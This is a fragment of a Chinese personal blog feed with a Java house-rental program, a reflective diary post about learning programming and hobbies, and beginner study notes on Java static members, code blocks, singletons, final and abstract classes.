class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.houserent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thestar0.houserent.view.HouseView;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/3/9 - 21:44</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: opp2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar0.houserent</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HouseRentAPP</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建HouseView对象显示主菜单，是整个程序的入口</span></span><br><span class="line">        <span class="keyword">new</span> HouseView().mainMenu();</span><br><span class="line">        System.out.println(<span class="string">&quot;你退出房屋出租系统&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四宇宙</title>
      <link href="//f312d95.html"/>
      <url>//f312d95.html</url>
      
        <content type="html"><![CDATA[<p>这是一段蓄意已久送给未来的自己的一段咬文爵字</p><p>现在发现，原来自己是想被自己认可罢了，打不赢时间，打不赢自己吗</p><p>3月7日凌晨，刷着一位进入某大厂的面经(这算第几十次刷面经吧)</p><p>不禁回想着，这半年都学了什么，到底想走或该走那个方向，到底怎么远离那个第四世界</p><p>像从前一样玩遍所有英雄选择最难最秀的英雄当本命，还是从二指到三指到四指到五指的操作</p><p>抖音里面虚假的世界，当自己走过，才明白世界上根本没有哪一个地方</p><p>最有感觉的是感觉每一天都在进步，无论是思想还是技术，每一周回想起上一周，就会觉得自己上一周好sb，这是这几个月以来的深有感受</p><p>无论是半年前从某个比赛误入了解了7区块链，我曾经颇感兴趣花了一下午，当我后面更了解时候*，里面的套路，币圈的面目，dao，和一些神奇的社区，后面不免觉得渗人</p><p>当我读着一本计划了半年的书，惊恐的了解了一家公司是怎么创建出来的，更清晰的认识了一个手机是怎么从零到一组装完成的(无非就是选一些供应链公司组装完成，芯片等需要联合芯片制造商工程师调教性能等)但软件没这么简单</p><p><img src="http://a1.qpic.cn/psc?/V136RGJ60mlPBP/ruAMsa53pVQWN7FLK88i5gfg*rgOm2JPDwonAazHT0dxao52jEqyH6cQiSu2ylZWA84JSBn*rBuoYe*xoDD4X3FoWGSvkpE8sJ0X5Ykxzjo!/b&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=IANYAiADWAIRECc!&amp;t=5&amp;tl=3&amp;su=0199656834&amp;tm=1648429200&amp;sce=0-12-12&amp;rf=2-9" alt=""></p><p>这是我2019年，望着窗边思考人生所拍</p><p>当我读另一本书的时候，不免佩服乔布斯的智慧，也更佩服他“自私”的果断，非与常人的苛刻</p><p>当我曾经决定踏上一个黑客的道路(名叫craker并非更专业的hacker)，学习那些苦涩难懂的天书，加密与解密，认识汇编语言，程序pe结构，可执行文件elf结构，动态链接库等等一堆专有名词，打着凭感觉的ctf比赛，这是一门非常优雅的方向，你可以让几乎任何软件实现自己想要的东西，更形象的说，你可以让游戏开挂</p><p>其实一开始暑假我很老实的学着java，一门企业级常用的编程语言，刚开始啥也不明白，买了一本书，80多吧，现在想起来真是悔不当初的一念冲动，之前学习很是随便，某站随便找一个视频，觉得不错，就听了下去，听了100多集，好像啥也没学明白，后来我才去看一名非常牛逼的教学视频(900多集，目前300多集)，从头开始，所以相当于两遍学习了一些基础知识，在此之前我发现了一款自己觉得不错的写作软件，后面经常用那个写文档，现在发现边学边记笔记的学习方法才挺适合自己，不过我最近用遍市面上所有的笔记，知识库软件，后面用那个软件估计最多写点博客吧，说偏了，其实我之前准备学java就是觉得java读着舒服哈哈哈哈，没管那么多，后面慢慢发现了他的好，其实也是拜一位人所赐，一上来就否认我，不过挺感谢她，冥冥之中给我指引了方向</p><p>后面我学了很多杂碎，对云计算有点好奇，搞了一些服务器，从0搭建服务器(运维吧)，配置域名，安全证书，rsa密钥等等，然后做了一个垃圾网站，不到几个小时就被封了，网站需要公安备案的，后面我换了一种方式越过这个，在这次的经历下，我了解了前端的很多东西，更了解云开发，对象存储等一系列东西，这个博客网站，耗费了1个多月的世界，配置很多很多东西，看过很多github的readme，一些大公司的博客文档教程，一步步配置，一步步摸索，遇到许许多多的bug，因为是命令行报错(黑窗口英文报错)，刚开始看不来bug，导致了好几次，删掉重来，后来越来越多的bug就越来越明白了，还有一些代码，根本没学过，但看多了，自然就会用了，和修改了，而在搭博客的过程中，有学了一点git皮毛，还有一些node js 等等一些杂碎(html js这些不多说)</p><p>之前听说Python爬虫可以赚零花钱，很可惜学了2小时，爬了一个百度就走继续学java了，Python之前在腾讯实验室(网站)学过一下午，.阿里实验室(网站)和华为实验室(网站)学过一点服务器的运维，做逆向分析经常看Python脚本，Python也可以略知一二吧</p><p>为何说是杂碎呢，因为学了很多很杂的东西，比如学kexue上网，公众号等，公众号之前不知道是我脑壳有毛病，曾经某个晚上准备注册一个公司(现在想起要笑死我)，那天晚上我创建企业微信，我那晚兴致勃勃，创建了一个公众号，刚开始是叫於摇光，摇光星是北斗七星的最后一颗星，想个名字花了我三个小时，那晚熬了很久的夜，一个朋友熬不动了就睡着了，我创建了企业微信，她是我的第一名客服，我tm领了一个1.8的红包，没笑死我，做公众号的原因是之前很多朋友找我要软件，我就想着公众号额。。。，就弄了个玩玩，目前有100多位关注者，1/4是朋友可能是1/5吧，收入7元，5元是一位不认识的网友，2元是一位超级好的朋友(男的)哈哈哈哈哈哈，还有一位朋友，刚开始在后台一直说我还在卷哈哈哈哈，目前已经停更了很久了，我最近一直在想一件事情，搬别人的东西，虽然不是100%搬，加上了自己的想法算不算自己的，我一直很纠结这个东西，当看见那篇写的很糟糕的文章有4000多阅读量，有时候能看见很多人正在观看，我心里面不是很高兴，总感觉像偷了别人的东西一样，不过我现在才发现，我tm文字都是自己写的，我慌个屁呀，虽然我不喜欢流量，害怕流量，但我觉得这是有意义的事情，因为可以帮助一些人，最近一直在想，到底做什么事情有意义，过什么样的生活有意义，当我很烦心的时候，会突然出门，找个秘密基地，看一些好看的风景，看一些好看的画，看一些人文，看那些在这同一个世界上活着的人，我喜欢看那些买东西商贩，路上的老人，公园座椅上的老年伴侣，亦或在某个风景站点，听着一对异性谈论着感情，亦或形单若影一个人走在街上，看着别人双人份的来往，说不羡慕，其实内心满是愧疚或者怀念吧</p><p>为什么是第四世界，我从很早开始，我就发现我越来越依赖手机了，我觉得和一些人处在不同的世界里，比如抖音里的网红们，或者一些微博里的高手，当我开始探寻世界的真相时候，我讨厌起了那个东西，流量，资本，什么都干，虚假，我只信里面的10%，于是我把手机尽力打造成智能生活里的钥匙，仿照那些手机广告里面的真正的手机，做一些自律的事情，比例写文章等拜托对手机依赖，曾经很喜欢的游戏，现在越来越觉得无感，感谢某个手机芯片的帮助，电脑游戏也无感，感谢电脑硬盘的告急……</p><p>终有一天，脱离这第四世界</p><p>其实还有很多话想给你说，不过我要睡着了</p><p>送给一年后的我</p><p>无论何人质疑你，无论何人诋毁你，说到底不过是想成为你——《fake》</p><p><img src="https://raw.githubusercontent.com/thestarx/Picgo/main/img/psc" alt="img"></p><p><img src="http://a1.qpic.cn/psc?/V136RGJ60mlPBP/ruAMsa53pVQWN7FLK88i5jNLofE3f3f5pix8fIuAWXLDGzxIfsFWrPRtG5tt*yJcBYXiYFdbtNG0f2pd5nNG8bBqwEY0JhGyOnJKZuB*PEw!/b&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=IANYAiADWAIRECc!&amp;t=5&amp;tl=3&amp;su=0168756130&amp;tm=1648429200&amp;sce=0-12-12&amp;rf=2-9" alt="img"></p><p><img src="http://a1.qpic.cn/psc?/V136RGJ60mlPBP/ruAMsa53pVQWN7FLK88i5jNLofE3f3f5pix8fIuAWXK.rwkv418D712F9JoN.*OFZN4QN2L5E1FPMeMRUb2wkhlGqmA0CanA1HyX5*wn.fY!/b&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=IANYAiADWAIRECc!&amp;t=5&amp;tl=3&amp;su=0147967202&amp;tm=1648429200&amp;sce=0-12-12&amp;rf=2-9" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java面向对象（高级）</title>
      <link href="//b0f32898.html"/>
      <url>//b0f32898.html</url>
      
        <content type="html"><![CDATA[<h1>类变量和类方法</h1><h2 id="为什么需要类变量">为什么需要类变量</h2><h3 id="案例">案例</h3><p>有一群小孩在玩堆雪人,不时有新的小孩加入,请问如何知道现在共有多少人在玩?，编写程序解决</p><p>下面是传统的代码编写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar.static_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.lang.model.SourceVersion;</span><br><span class="line"><span class="keyword">import</span> javax.lang.model.element.VariableElement;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/3/12 - 14:20</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: oop3</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar.static_</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChildGame</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> couter = <span class="number">0</span>;</span><br><span class="line">        Child child1 = <span class="keyword">new</span> Child(<span class="string">&quot;白骨精&quot;</span>);</span><br><span class="line">        child1.jion();</span><br><span class="line">        couter++;</span><br><span class="line">        Child child2 = <span class="keyword">new</span> Child(<span class="string">&quot;蜘蛛精&quot;</span>);</span><br><span class="line">        child2.jion();</span><br><span class="line">        couter++;</span><br><span class="line">        Child child3 = <span class="keyword">new</span> Child(<span class="string">&quot;老鼠精&quot;</span>);</span><br><span class="line">        child3.jion();</span><br><span class="line">        couter++;</span><br><span class="line">        System.out.println(conter + <span class="string">&quot;个小孩参加了游戏&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> String name ;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Child</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jion</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;参加了游戏&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>缺点，couter是独立于oop编程单独存在的，而且，随着写的越来越多的小孩，代码会很冗余</p><h2 id="什么是类变量">什么是类变量</h2><blockquote><p>类变量也叫静态变量/静态属性，是该类的所有共享的变量，任何一个该类的对象去访问它时，取到的都是相同的值，同样任何一个该类的对象去修改它时，修改的也是同一个变量</p></blockquote><h2 id="类变量定义语法">类变量定义语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问修饰符 <span class="keyword">static</span> 数据类型 变量名;（建议用这个）</span><br><span class="line"><span class="keyword">static</span> 访问修饰符 数据类型 变量名;</span><br></pre></td></tr></table></figure><h2 id="如何访问类变量">如何访问类变量</h2><p>类名.类变量名</p><p>或者 对象名.类变量名【静态变量的访问修饰符权限和范围和普通变量属性是一样的】</p><h2 id="类变量使用注意事项和细节讨论">类变量使用注意事项和细节讨论</h2><ol><li>什么时候需要用类变量</li></ol><p>当我们需要让某个类的所有对象都共享一个变量时，就可以考虑使用类变量（静态变量）;</p><ol start="2"><li>类变量与实例变量（普通属性）区别</li></ol><p>类变量是该类的所有对象共享的，而实例变量是每个对象独享的</p><ol start="3"><li>加上static称为类变量或静态变量，否则称为实例变量/普通变量/非静止变量</li><li>类变量可以通过 类名.类变量名 或者 对象名.类变量名 来访问。但java设计者推荐我们使用 类名.类变量名方式访问【前提是满足访问修饰符的访问权限和范围】</li><li>实例变量不是通过 类名.类变量名 方式访问</li><li>类变量是在类加载时就初始化了，也就是说，即使你没有创建对象，只要类加载了，就可以使用类变量了</li><li>类变量的生命周期是随类的加载开始，随类的消亡而销毁</li></ol><h1>main方法理解</h1><h2 id="理解-main-方法语法">理解 main 方法语法</h2><ol><li>main方法时虚拟机调用</li><li>Java虚拟机需要调用类的main()方法，所以该方法的访问权限必须是public</li><li>Java虚拟机在执行main()方法时不必创建对象，所以该方法必须是static</li><li>该方法接受String类型的数组参数，该数组中保存执行java命令时传递给所运行的类的参数</li><li>Java执行的程序的程序</li></ol><h2 id="注意事项">注意事项</h2><blockquote><p>在 main()方法中，我们可以直接调用 main 方法所在类的静态方法或静态属性。</p><p>但是，不能直接访问该类中的非静态成员，必须创建该类的一个实例对象后，才能通过这个对象去访问类中的非静态成员</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main01</span> </span>&#123;</span><br><span class="line"><span class="comment">//静态的变量/属性</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String name = <span class="string">&quot;thestar&quot;</span>;</span><br><span class="line"><span class="comment">//非静态的变量/属性</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> n1 = <span class="number">10000</span>;</span><br><span class="line"><span class="comment">//静态方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hi</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Main01 的 hi 方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//非静态方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cry</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Main01 的 cry 方法&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//可以直接使用 name</span></span><br><span class="line"><span class="comment">//1. 静态方法 main 可以访问本类的静态成员</span></span><br><span class="line">System.out.println(<span class="string">&quot;name=&quot;</span> + name);</span><br><span class="line">hi();</span><br><span class="line"><span class="comment">//2. 静态方法 main 不可以访问本类的非静态成员</span></span><br><span class="line"><span class="comment">//System.out.println(&quot;n1=&quot; + n1);//错误</span></span><br><span class="line"><span class="comment">//cry();</span></span><br><span class="line"><span class="comment">//3. 静态方法 main 要访问本类的非静态成员，需要先创建对象 , 再调用即可</span></span><br><span class="line">Main01 main01 = <span class="keyword">new</span> Main01();</span><br><span class="line">System.out.println(main01.n1);<span class="comment">//ok</span></span><br><span class="line">main01.cry();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>代码块</h1><h2 id="基本介绍-4">基本介绍</h2><blockquote><p>代码化块又称为初始化块，属性类中的成员，类似于方法，将逻辑语句封装在方法体中，通过{}包围起来</p><p>但和方法不同，没有方法名，没有返回，没有参数，只有方法体，而且不用通过对象或类显示调用，而是加载类时，或创建对象时隐式调用</p></blockquote><h2 id="基本语法-2">基本语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">修饰符&#123;</span><br><span class="line">代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明事项</p><ul><li>修饰符 可选，要写的话，也只能写static</li><li>代码块分为两类，使用static修饰的叫做静态代码快，没有static修饰的叫做普通代码快/非静态代码块</li><li>逻辑语句可以为任意逻辑语句（输入，输出，方法调用，循环，判断等）</li><li>；号可以写也可以不写（省略）</li></ul><h2 id="代码块的好处">代码块的好处</h2><ul><li>相当于另外一种形式的构造器（对构造器的补充机制），可以做初始化的操作</li><li>场景：如果对个构造器中都有重复的语句，可以抽取到初始化块（代码块）中，提高代码的复用性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CodeBlock01</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">Movie movie = <span class="keyword">new</span> Movie(<span class="string">&quot;你好，李焕英&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;===============&quot;</span>);</span><br><span class="line">Movie movie2 = <span class="keyword">new</span> Movie(<span class="string">&quot;唐探 3&quot;</span>, <span class="number">100</span>, <span class="string">&quot;陈思诚&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Movie</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">double</span> price;</span><br><span class="line"><span class="keyword">private</span> String director;</span><br><span class="line"><span class="comment">//3 个构造器-》重载</span></span><br><span class="line"><span class="comment">//老韩解读</span></span><br><span class="line"><span class="comment">//(1) 下面的三个构造器都有相同的语句</span></span><br><span class="line"><span class="comment">//(2) 这样代码看起来比较冗余</span></span><br><span class="line"><span class="comment">//(3) 这时我们可以把相同的语句，放入到一个代码块中，即可</span></span><br><span class="line"><span class="comment">//(4) 这样当我们不管调用哪个构造器，创建对象，都会先调用代码块的内容</span></span><br><span class="line"><span class="comment">//(5) 代码块调用的顺序优先于构造器.. &#123;</span></span><br><span class="line">System.out.println(<span class="string">&quot;电影屏幕打开...&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;广告开始...&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;电影正是开始...&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Movie</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Movie(String name) 被调用...&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Movie</span><span class="params">(String name, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="keyword">this</span>.price = price;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Movie</span><span class="params">(String name, <span class="keyword">double</span> price, String director)</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Movie(String name, double price, String director) 被调用...&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="keyword">this</span>.price = price;</span><br><span class="line"><span class="keyword">this</span>.director = director;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="代码块的使用细节和注意事项">代码块的使用细节和注意事项</h2><blockquote><p>static代码块也叫静态代码块，作用就是对类进行初始化，而且随着==类的加载而执行==而执行，并且只会执行一次，如果是普通代码块，每创建一个对象，就执行</p></blockquote><h3 id="类什么时候被加载">类什么时候被加载</h3><ol><li>创建对象实例时（new）</li><li>创建子类对象实例，父类也会被加载</li><li>使用类的静态成员时（静态属性，静态方法）</li></ol><blockquote><p>普通的代码块。在创建对象实例时，会被隐式的调用，被创建一次，就会被调用一次</p></blockquote><h3 id="总结">总结</h3><ol><li>static代码块是随着==类加载==时，执行，只会执行一次</li><li>普通代码块是创建对象时调用的，创建一次，调用一次</li><li>类加载的3种情况</li></ol><h2 id="创建对象，一个类的调用顺序">创建对象，一个类的调用顺序</h2><ol><li><p>调用静态代码块和静态属性初始化（注意，静态代码块和静态属性初始化调用的优先级一样，如果有多个静态代码块和多个静态变量的初始化，则按它们的定义的顺序调用）</p></li><li><p>调用普通代码块和普通属性的初始化（注意：普通代码块和普通属性初始化调用的优先级一样，如果多个普通代码块和多个普通属性初始化，则按照定义顺序调用）</p></li><li><p>调用构造方法</p></li></ol><blockquote><p>构造器的最前面其实隐含了super()和调用普通代码块</p><p>静态相关的代码块，属性初始化，在类加载时，就执行完毕，因此是优于构造器和普通代码块执行的</p></blockquote><h3 id="创建一个子类对象时（继承关系），他们的静态代码块，静态属性初始化，普通代码块，普通属性初始化，构造方法（构造器）的调用顺序">创建一个子类对象时（继承关系），他们的静态代码块，静态属性初始化，普通代码块，普通属性初始化，构造方法（构造器）的调用顺序</h3><ol><li>父类的静态代码块和静态属性（优先级一样，按定义顺序执行）</li><li>子类的静态代码块和静态属性（优先级一样，按定义顺序执行）</li><li>父类的普通代码块和普通属性初始化（优先级一样，按定义顺序执行）</li><li>父类的构造方法（构造器）</li><li>子类的普通代码快和普通属性初始化（优先级一样，按定义顺序执行）</li><li>子类的构造方法（构造器）</li></ol><p>==静态代码块只能调用静态成员（静态属性和静态方法）==</p><p>==普通代码块可以调用任意成员==</p><h1>单例设计模式</h1><h2 id="什么是设计模式">什么是设计模式</h2><blockquote><p>设计模式是在大量的实践中总结和理论化之后优选的代码结构，编程风格，以及解决问题的思考方式。设计模式好比经典的棋谱，不同的棋局，我们用不同的棋谱，免去我们自己再思考和摸索</p></blockquote><h2 id="单例模式是什么">单例模式是什么</h2><blockquote><p>所谓的类的单例设计模式，就是采取一定的方法保证在整个的软件系统中，对某个类只能存在一个对象实例，并且该类只提供一个取得其对象实例的方法</p></blockquote><h3 id="单例模式有两种">单例模式有两种</h3><ul><li>饿汉式</li><li>懒汉式</li></ul><h2 id="单例模式之饿汉式的实现步骤">单例模式之饿汉式的实现步骤</h2><ol><li>构造器私有化（防止直接new）</li><li>类的内部创建对象</li><li>向外暴露一个静态的公共方法</li></ol><h2 id="饿汉式和懒汉式的区别">饿汉式和懒汉式的区别</h2><ul><li>二者最主要的区别在于创建对象的时机不同：饿汉式是在类加载就创建了对象实例，而懒汉式是在使用时才创建的</li><li>饿汉式不存在线程安全问题，懒汉式存在线程安全的问题</li><li>饿汉式存在浪费资源的可能。因为如果程序员一个对象实例都没有使用，那么饿汉式创建的对象就浪费了，懒汉式是使用时才创建，就不存在这个问题</li><li>在javaSE标准类中，java.lang.Runtime就是经典的单例模式</li></ul><h1>final关键字</h1><h3 id="基本介绍-5">基本介绍</h3><p>final 中文意思：最后的，最终的</p><p>final 可以修饰类，属性，方法和局部变量</p><p>在一些情况下，程序员可能有以下的需求，就会使用到final：</p><ol><li>当不希望被继承时，可以用final修饰</li><li>当不希望父类的某个方法被子类覆盖/重写（override）时，可以用final关键字修饰[访问修饰符 final 返回类型 方法名]</li><li>当不希望父类的某个属性的值被修改，可以用final修饰  [public fianl double TAX_RATE = 0.08]</li><li>当不希望某个局部变量被修改，可以使用final修饰 [fianl double TAX_RATE = 0.08]</li></ol><h2 id="final使用注意事项和细节">final使用注意事项和细节</h2><ol><li><p>final修饰的属性又叫常量，一般用 XX_XX_XX来命名</p></li><li><p>final修饰的属性在定义时，必须赋初值，并且以后不能再修改，赋值可以在如下的位置之一[选择一个位置赋初值即可]</p><ul><li>定义时：如 public final double TAX_RATE = 0.08;</li><li>在构造器中</li><li>在代码块中</li></ul></li><li><p>如果final修饰的属性是静态的，则初始化的位置只能是</p><ul><li>定义时</li><li>在静态代码块，不能在构造器中赋值</li></ul></li><li><p>final类不能继承，但是可以实例化对象</p></li><li><p>如果类不是final类，但是含有final方法，则该方法虽然不能重写，但是可以被继承</p></li><li><p>一般来说，如果一个类已经是final类了，就没有必要再将方法修饰成final方法</p></li><li><p>final不能修饰构造方法（即构造器）</p></li><li><p>fianl 和 static 往往搭配使用，效率更高，不会导致类加载.底层编译器做了优化处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Domo&#123;</span><br><span class="line">public static final int i = 16;</span><br><span class="line">    static&#123;</span><br><span class="line">    System.out.println(&quot;thestar&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>包装类（Integer,Double,Float,Boolean等都是final），String也是final类</p></li></ol><h1>抽象类</h1><blockquote><p>当父类的某些方法，需要声明，但是又不确定如何实现时，可以将其声明为抽象方法，那么这个类就是抽象类</p></blockquote><h2 id="抽象类的介绍">抽象类的介绍</h2><ol><li><p>用abstract关键字来修饰一个类时，这个类就叫抽象类</p><p>访问修饰符 abstract 类名{</p><p>}</p></li><li><p>用abstract关键字来修饰一个方法时，这个方法就是抽象方法</p><p>访问修饰符 abstract 返回类型 方法名(参数列表);//没有方法体，也就是说没有{}</p></li><li><p>抽象类的价值更多在于设计，是设计者设计好后，让子类继承并实现抽象类{}</p></li><li><p>抽象类，是面试官比较爱问的知识点，在框架和设计模式使用较多</p></li></ol><h2 